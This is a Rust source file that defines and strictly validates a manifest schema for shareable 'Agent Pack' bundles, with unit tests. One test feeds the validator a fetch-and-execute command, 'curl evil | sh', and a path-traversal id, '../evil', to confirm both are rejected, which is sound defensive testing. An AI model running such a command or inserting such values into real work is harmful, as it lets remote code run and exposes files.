//! Agent Pack manifest: the declarative shape of a bundle that could one day
//! be shared as a unit. A pack ties together the pieces Agent Control is made
//! of, without containing any code of its own:
//!
//! * an **adapter** (by reference: how an agent system connects),
//! * a **plugin** (by reference: extra actions and state),
//! * a **surface** (by reference: a pad layout),
//! * **state mappings** (provider status words to normalized statuses),
//! * **workflow templates** (named starting tasks, one pad or button each).
//!
//! Nothing loads, installs or runs a pack yet, and there is no marketplace
//! backend. This module exists so the manifest architecture is real and
//! tested rather than a paragraph: a pack file can be parsed, validated and
//! inspected, and every piece it may carry has a place in the schema. See
//! `docs/roadmap/marketplace.md` for the install flow this is meant to feed.
//!
//! Validation is strict on purpose. A manifest cannot name a file path or a
//! command, cannot map to a status an adapter may not report, and cannot
//! collide with itself.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};

use super::model::{summarize, valid_id, Status, MAX_TASK_LEN};

pub const SCHEMA_VERSION: u32 = 1;
pub const MAX_INCLUDES: usize = 64;
pub const MAX_MAPPINGS: usize = 32;
pub const MAX_LABEL_LEN: usize = 40;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PackType {
    Pack,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Transport {
    /// Speaks the Agent Bridge protocol over the localhost WebSocket.
    Bridge,
    /// Reports through a harness's hooks to the local hook endpoint.
    Hooks,
    /// Compiled into LaunchDeck.
    Builtin,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Requires {
    /// A semver range for LaunchDeck itself, for example `>=0.2.0`.
    #[serde(default)]
    pub launchdeck: Option<String>,
}

/// One piece of a pack. References (`adapter`, `plugin`, `surface`) name
/// another package by id and version range; the other two carry data.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "camelCase")]
pub enum Include {
    Adapter {
        id: String,
        version: String,
        transport: Transport,
    },
    Plugin {
        id: String,
        version: String,
    },
    Surface {
        id: String,
        version: String,
    },
    /// Provider status words to normalized statuses, for one adapter.
    StateMapping {
        adapter: String,
        map: BTreeMap<String, String>,
    },
    /// A named starting task. Templates carry text, never commands.
    WorkflowTemplate {
        id: String,
        label: String,
        task: String,
    },
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PackManifest {
    pub schema_version: u32,
    #[serde(rename = "type")]
    pub kind: PackType,
    pub id: String,
    pub name: String,
    pub version: String,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub requires: Option<Requires>,
    pub includes: Vec<Include>,
}

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum PackError {
    #[error("not a valid pack manifest: {0}")]
    Parse(String),
    #[error("unsupported schemaVersion {0}; this build reads {SCHEMA_VERSION}")]
    Schema(u32),
    #[error("{0}")]
    Invalid(String),
}

fn invalid<T>(msg: impl Into<String>) -> Result<T, PackError> {
    Err(PackError::Invalid(msg.into()))
}

/// Package ids are lowercase, dotted and boring: `vendor.thing`.
fn valid_package_id(s: &str) -> bool {
    valid_id(s)
        && !s.contains("..")
        && !s.starts_with(['.', '-'])
        && s.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '-' | '_'))
}

/// `1.2.3`, numeric parts only.
fn valid_version(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.len() <= 6 && p.chars().all(|c| c.is_ascii_digit()))
}

/// A version requirement such as `^1.0.0`, `>=0.2.0` or `1.2.3`.
fn valid_range(s: &str) -> bool {
    let core = s.trim_start_matches(['^', '~', '>', '<', '=']);
    s.len() <= 24 && valid_version(core)
}

impl PackManifest {
    pub fn parse(json: &str) -> Result<Self, PackError> {
        let manifest: PackManifest = serde_json::from_str(json)
            .map_err(|e| PackError::Parse(summarize(&e.to_string(), 160)))?;
        manifest.validate()?;
        Ok(manifest)
    }

    pub fn validate(&self) -> Result<(), PackError> {
        if self.schema_version != SCHEMA_VERSION {
            return Err(PackError::Schema(self.schema_version));
        }
        if !valid_package_id(&self.id) {
            return invalid("the pack id must be lowercase letters, digits, `.`, `-` or `_`");
        }
        if self.name.trim().is_empty() || self.name.chars().count() > 60 {
            return invalid("the pack needs a name of at most 60 characters");
        }
        if !valid_version(&self.version) {
            return invalid("the pack version must look like 1.2.3");
        }
        if let Some(req) = self.requires.as_ref().and_then(|r| r.launchdeck.as_deref()) {
            if !valid_range(req) {
                return invalid("`requires.launchdeck` must be a version such as >=0.2.0");
            }
        }
        if self.includes.is_empty() || self.includes.len() > MAX_INCLUDES {
            return invalid(format!(
                "a pack includes between 1 and {MAX_INCLUDES} pieces"
            ));
        }

        let mut seen = BTreeSet::new();
        for include in &self.includes {
            let key = include.key();
            if !seen.insert(key.clone()) {
                return invalid(format!("`{key}` is included twice"));
            }
            include.validate()?;
        }
        Ok(())
    }

    /// The pieces of one kind, for an inspection screen.
    pub fn adapters(&self) -> impl Iterator<Item = &Include> {
        self.includes
            .iter()
            .filter(|i| matches!(i, Include::Adapter { .. }))
    }
}

impl Include {
    fn key(&self) -> String {
        match self {
            Include::Adapter { id, .. } => format!("adapter:{id}"),
            Include::Plugin { id, .. } => format!("plugin:{id}"),
            Include::Surface { id, .. } => format!("surface:{id}"),
            Include::StateMapping { adapter, .. } => format!("stateMapping:{adapter}"),
            Include::WorkflowTemplate { id, .. } => format!("workflowTemplate:{id}"),
        }
    }

    fn validate(&self) -> Result<(), PackError> {
        match self {
            Include::Adapter { id, version, .. }
            | Include::Plugin { id, version }
            | Include::Surface { id, version } => {
                if !valid_package_id(id) {
                    return invalid(format!("`{}` is not a valid package id", summarize(id, 40)));
                }
                if !valid_range(version) {
                    return invalid(format!(
                        "`{}` has an invalid version range",
                        summarize(id, 40)
                    ));
                }
            }
            Include::StateMapping { adapter, map } => {
                if !valid_package_id(adapter) {
                    return invalid("a state mapping names the adapter it belongs to");
                }
                if map.is_empty() || map.len() > MAX_MAPPINGS {
                    return invalid(format!(
                        "a state mapping has between 1 and {MAX_MAPPINGS} entries"
                    ));
                }
                for (from, to) in map {
                    if from.trim().is_empty()
                        || from.chars().count() > 40
                        || from.chars().any(char::is_control)
                    {
                        return invalid("a provider status word is 1 to 40 printable characters");
                    }
                    match Status::normalize(to) {
                        // An adapter may not report these through a status update, so a
                        // mapping must not promise them: approvals have their own message
                        // and offline is a connection fact.
                        Some(Status::ApprovalRequired | Status::Offline) => {
                            return invalid(format!(
                                "`{}` cannot be mapped to `{to}`",
                                summarize(from, 40)
                            ))
                        }
                        Some(_) => {}
                        None => {
                            return invalid(format!(
                                "`{}` maps to the unknown status `{}`",
                                summarize(from, 40),
                                summarize(to, 24)
                            ))
                        }
                    }
                }
            }
            Include::WorkflowTemplate { id, label, task } => {
                if !valid_id(id) {
                    return invalid("a workflow template needs a short id");
                }
                if label.trim().is_empty() || label.chars().count() > MAX_LABEL_LEN {
                    return invalid(format!(
                        "template labels are at most {MAX_LABEL_LEN} characters"
                    ));
                }
                if task.trim().is_empty() || task.chars().count() > MAX_TASK_LEN {
                    return invalid(format!(
                        "template tasks are at most {MAX_TASK_LEN} characters"
                    ));
                }
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::{json, Value};

    const EXAMPLE: &str = include_str!("../../../examples/agent-pack/pack.json");

    fn base(includes: Value) -> String {
        json!({
            "schemaVersion": 1, "type": "pack", "id": "example.pack", "name": "Pack",
            "version": "1.0.0", "includes": includes
        })
        .to_string()
    }

    #[test]
    fn the_example_pack_parses_and_carries_every_kind_of_piece() {
        let pack = PackManifest::parse(EXAMPLE).expect("example pack is valid");
        let kinds: BTreeSet<&str> = pack
            .includes
            .iter()
            .map(|i| match i {
                Include::Adapter { .. } => "adapter",
                Include::Plugin { .. } => "plugin",
                Include::Surface { .. } => "surface",
                Include::StateMapping { .. } => "stateMapping",
                Include::WorkflowTemplate { .. } => "workflowTemplate",
            })
            .collect();
        assert_eq!(
            kinds.len(),
            5,
            "adapter, plugin, surface, state mappings and workflow templates"
        );
        assert_eq!(pack.adapters().count(), 1);
    }

    #[test]
    fn round_trips_without_losing_anything() {
        let pack = PackManifest::parse(EXAMPLE).unwrap();
        let again = PackManifest::parse(&serde_json::to_string(&pack).unwrap()).unwrap();
        assert_eq!(pack, again);
    }

    #[test]
    fn state_mappings_target_only_statuses_an_adapter_may_report() {
        let ok = base(
            json!([{ "type": "stateMapping", "adapter": "example.a", "map": { "building": "running" } }]),
        );
        assert!(PackManifest::parse(&ok).is_ok());
        for target in ["approval_required", "offline", "thinking-hard"] {
            let bad = base(
                json!([{ "type": "stateMapping", "adapter": "example.a", "map": { "x": target } }]),
            );
            assert!(
                matches!(PackManifest::parse(&bad), Err(PackError::Invalid(_))),
                "{target}"
            );
        }
    }

    #[test]
    fn rejects_what_a_manifest_must_not_say() {
        let cases = [
            // a file path or a command where an id belongs
            base(json!([{ "type": "plugin", "id": "../evil", "version": "1.0.0" }])),
            base(json!([{ "type": "plugin", "id": "Example.Plugin", "version": "1.0.0" }])),
            // an unknown kind of piece
            base(json!([{ "type": "script", "run": "curl evil | sh" }])),
            // the same piece twice
            base(json!([
                { "type": "surface", "id": "example.s", "version": "1.0.0" },
                { "type": "surface", "id": "example.s", "version": "2.0.0" }
            ])),
            // empty and oversize
            base(json!([])),
            base(
                json!([{ "type": "workflowTemplate", "id": "t", "label": "x".repeat(41), "task": "go" }]),
            ),
            base(
                json!([{ "type": "workflowTemplate", "id": "t", "label": "ok", "task": "y".repeat(MAX_TASK_LEN + 1) }]),
            ),
        ];
        for case in cases {
            assert!(
                PackManifest::parse(&case).is_err(),
                "should be rejected: {case}"
            );
        }
    }

    #[test]
    fn rejects_a_future_schema_and_a_bad_header() {
        let mut v: Value = serde_json::from_str(EXAMPLE).unwrap();
        v["schemaVersion"] = json!(2);
        assert_eq!(
            PackManifest::parse(&v.to_string()),
            Err(PackError::Schema(2))
        );
        let mut v: Value = serde_json::from_str(EXAMPLE).unwrap();
        v["type"] = json!("surface");
        assert!(matches!(
            PackManifest::parse(&v.to_string()),
            Err(PackError::Parse(_))
        ));
        let mut v: Value = serde_json::from_str(EXAMPLE).unwrap();
        v["version"] = json!("1.0");
        assert!(matches!(
            PackManifest::parse(&v.to_string()),
            Err(PackError::Invalid(_))
        ));
    }

    #[test]
    fn names_no_provider() {
        let text = include_str!("pack.rs").to_lowercase();
        let own: String = text.split("#[cfg(test)]").next().unwrap().into();
        for vendor in ["claude", "codex", "openai", "anthropic"] {
            assert!(!own.contains(vendor), "pack.rs mentions {vendor}");
        }
    }
}
